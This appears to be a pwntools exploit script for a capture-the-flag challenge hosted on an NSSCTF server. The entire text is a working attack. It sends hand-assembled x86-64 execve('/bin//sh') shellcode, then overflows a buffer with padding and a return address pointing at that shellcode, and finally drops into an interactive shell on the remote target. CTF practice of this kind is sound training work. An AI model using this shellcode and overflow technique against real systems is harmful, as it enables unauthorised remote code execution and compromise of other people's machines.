from pwn import *

io = process("./pwn")
io = remote('node3.anna.nssctf.cn', 28729)
sh  = "\x48\x31\xd2" 
sh += "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
sh += "\x48\xc1\xeb\x08"
sh += "\x53" 
sh += "\x48\x89\xe7"
sh += "\x50"
sh += "\x57"
sh += "\x48\x89\xe6"
sh += "\xb0\x3b" 
sh += "\x0f\x05"
 

io.sendafter('Please.\n', sh)
io.sendafter('start!\n', 'A'*0xA + 'deedbeef'+ p64(0x6010A0))

io.interactive()